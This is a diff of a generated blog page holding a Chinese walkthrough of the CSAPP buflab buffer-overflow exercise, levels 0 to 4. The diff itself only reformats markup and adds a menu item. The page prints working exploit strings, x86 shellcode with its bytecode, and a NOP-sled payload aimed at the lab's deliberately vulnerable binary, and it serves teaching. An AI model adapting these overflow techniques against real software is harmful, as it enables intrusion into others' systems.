@@ -213,6 +213,16 @@
         </li>
       
         
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-archives">
           <a href="/archives/%20" rel="section">
             
@@ -356,7 +366,8 @@
       
 
       
-        <p><strong>CSAPP-buflab缓冲区溢出实验</strong><br><a id="more"></a></p>
+        <p><strong>CSAPP-buflab缓冲区溢出实验</strong></p>
+<a id="more"></a>
 <h3 id="先决条件："><a href="#先决条件：" class="headerlink" title="先决条件："></a>先决条件：</h3><p><img src="/2019/06/03/CSAPP-buflab/Picture1.png" alt></p>
 <p>因为getbuf函数在使用gets读取字符，并赋值给buf数组时，没有进行长度的检查，导致可以输入任意多的字符，实现缓冲区的溢出漏洞的利用和攻击</p>
 <p><strong>getbuf中buf首地址</strong></p>
@@ -374,7 +385,9 @@
 <p>那么buf栈帧中<strong>ebp-0x29</strong>到<strong>ebp-0x2c</strong>为保存的旧的ebp，</p>
 <p><strong>ebp-0x2d</strong>到<strong>ebp-0x30</strong>为getbuf函数的返回地址<img src="/2019/06/03/CSAPP-buflab/Picture5.png" alt></p>
 <p>虽然说0x08048e0a为smoke的地址，但是因为0x0a是换行符，会被gets函数认为是字符串的结束，导致exp不完整，所以需要向下取地址</p>
-<p><strong>exp：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 </span><br><span class="line">0b 8e 04 08</span><br></pre></td></tr></table></figure></p>
+<p><strong>exp：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 </span><br><span class="line">0b 8e 04 08</span><br></pre></td></tr></table></figure>
+
 <h3 id="level1-Sparkler"><a href="#level1-Sparkler" class="headerlink" title="level1: Sparkler"></a>level1: Sparkler</h3><p><img src="/2019/06/03/CSAPP-buflab/Picture7.png" alt></p>
 <p><strong>任务：</strong></p>
 <p>与level0相似的功能，但是需要传递给fizz的参数val为你自己的cookies</p>
@@ -382,22 +395,30 @@
 <p>程序在进行函数调用的过程中，如果需要进行参数的传递，会将需要传递的参数放在调用者的栈帧中，然后再进行函数的调用</p>
 <p>所以在这里只需要找到传递参数val在被调用者栈帧中的位置即可（ebp+0x8）</p>
 <p><img src="/2019/06/03/CSAPP-buflab/Picture8.png" alt></p>
-<p><strong>exp:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 </span><br><span class="line">af 8d 04 08 </span><br><span class="line">30 31 32 33 </span><br><span class="line">64 84 36 37</span><br></pre></td></tr></table></figure></p>
+<p><strong>exp:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 </span><br><span class="line">af 8d 04 08 </span><br><span class="line">30 31 32 33 </span><br><span class="line">64 84 36 37</span><br></pre></td></tr></table></figure>
+
 <p>0x08038daf为fizz函数的地址，0x37368464为cookies</p>
 <h3 id="level2-Firecracker"><a href="#level2-Firecracker" class="headerlink" title="level2: Firecracker"></a>level2: Firecracker</h3><p><img src="/2019/06/03/CSAPP-buflab/Picture10.png" alt><br><img src="/2019/06/03/CSAPP-buflab/Picture11.png" alt></p>
 <p><strong>任务：</strong></p>
 <p>与level1相似，但是需要设置全局变量global_value的值为cookies，并需要跳转到bang函数</p>
 <p><strong>原理：</strong></p>
 <p>模拟寄存器来设置全局变量global_value和函数返回</p>
-<p><strong>shellcode：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x37368464,%eax</span><br><span class="line">movl %eax,0x0804d10c</span><br><span class="line">push $0x08048d52</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></p>
-<p><strong>字节码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37</span><br><span class="line">a3 0c d1 04 08</span><br><span class="line">68 52 8d 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure></p>
+<p><strong>shellcode：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x37368464,%eax</span><br><span class="line">movl %eax,0x0804d10c</span><br><span class="line">push $0x08048d52</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p><strong>字节码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37</span><br><span class="line">a3 0c d1 04 08</span><br><span class="line">68 52 8d 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
+
 <p>因为需要执行字节码的功能，所以要将返回值更改为buf数组的首地址</p>
 <p>执行完全局变量的赋值操作后，将bang函数的首地址推入栈，再ret，即能返回到bang函数中</p>
 <p><strong>bang首地址：</strong></p>
 <p><img src="/2019/06/03/CSAPP-buflab/Picture14.png" alt></p>
 <p><strong>buf首地址：</strong></p>
 <p><img src="/2019/06/03/CSAPP-buflab/Picture15.png" alt></p>
-<p><strong>exp:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37</span><br><span class="line">a3 0c d1 04 08</span><br><span class="line">68 52 8d 04 08</span><br><span class="line">c3</span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 </span><br><span class="line">30 31 32 33</span><br><span class="line">68 3a 68 55</span><br></pre></td></tr></table></figure></p>
+<p><strong>exp:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37</span><br><span class="line">a3 0c d1 04 08</span><br><span class="line">68 52 8d 04 08</span><br><span class="line">c3</span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 </span><br><span class="line">30 31 32 33</span><br><span class="line">68 3a 68 55</span><br></pre></td></tr></table></figure>
+
 <p>字节码16 + 28 + 返回地址4 = 48</p>
 <h3 id="level3-Dynamite"><a href="#level3-Dynamite" class="headerlink" title="level3: Dynamite"></a>level3: Dynamite</h3><p><img src="/2019/06/03/CSAPP-buflab/Picture17.png" alt></p>
 <p><strong>任务：</strong></p>
@@ -405,14 +426,20 @@
 <p><strong>原理：</strong></p>
 <p>因为函数调用后的返回值保存在eax中，所以可以模拟寄存器将cookies写入eax中</p>
 <p>调用getbuf函数后的返回地址(0x08048e50)：<br><img src="/2019/06/03/CSAPP-buflab/Picture18.png" alt></p>
-<p><strong>shellcode：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x37368464,%eax</span><br><span class="line">push $0x08048e50</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></p>
-<p><strong>字节码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37</span><br><span class="line">68 50 8e 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure></p>
+<p><strong>shellcode：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x37368464,%eax</span><br><span class="line">push $0x08048e50</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p><strong>字节码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37</span><br><span class="line">68 50 8e 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
+
 <p>同时要保持test栈帧的完整性，也就是在执行完exp后pc要返回到test栈帧中调用getbuf函数的下一个地址，保证test函数的正常运行和结束</p>
 <p><strong>buf首地址：</strong></p>
 <p><img src="/2019/06/03/CSAPP-buflab/Picture15.png" alt></p>
 <p><strong>test栈帧中的ebp（保存的旧的ebp）：</strong></p>
 <p><img src="/2019/06/03/CSAPP-buflab/Picture21.png" alt></p>
-<p><strong>exp：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37</span><br><span class="line">68 50 8e 04 08</span><br><span class="line">c3</span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 </span><br><span class="line">c0 3a 68 55</span><br><span class="line">68 3a 68 55</span><br></pre></td></tr></table></figure></p>
+<p><strong>exp：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37</span><br><span class="line">68 50 8e 04 08</span><br><span class="line">c3</span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 </span><br><span class="line">c0 3a 68 55</span><br><span class="line">68 3a 68 55</span><br></pre></td></tr></table></figure>
+
 <h3 id="level4-Nitroglycerin"><a href="#level4-Nitroglycerin" class="headerlink" title="level4: Nitroglycerin"></a>level4: Nitroglycerin</h3><p><img src="/2019/06/03/CSAPP-buflab/Picture23.png" alt></p>
 <p><strong>任务：</strong></p>
 <p>因为程序在运行的过程中，对于每一个用户而言，其对应的栈指针的位置其实大概率是不相同的</p>
@@ -428,8 +455,12 @@
 <p><img src="/2019/06/03/CSAPP-buflab/Picture25.png" alt><br>最大地址为0x556838e8</p>
 <p><strong>esp与ebp的相对位置：</strong></p>
 <p><img src="/2019/06/03/CSAPP-buflab/Picture26.png" alt><br>push ebx 后ebp与esp差4，sub esp 0x24后ebp与esp差0x28</p>
-<p><strong>shellcode：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x37368464,%eax</span><br><span class="line">lea 0x28(%esp),%ebp</span><br><span class="line">push $0x8048ce2</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></p>
-<p><strong>字节码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37 </span><br><span class="line">8d 6c 24 28 </span><br><span class="line">68 e2 8c 04 08 </span><br><span class="line">c3</span><br></pre></td></tr></table></figure></p>
+<p><strong>shellcode：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x37368464,%eax</span><br><span class="line">lea 0x28(%esp),%ebp</span><br><span class="line">push $0x8048ce2</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p><strong>字节码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37 </span><br><span class="line">8d 6c 24 28 </span><br><span class="line">68 e2 8c 04 08 </span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
+
 <p><strong>exp：</strong><br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90</p>
 <p>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90</p>
 <p>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90</p>
@@ -641,7 +672,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">33.3k</span>
+    <span title="Site words total count">32.4k</span>
   
 </div>
 
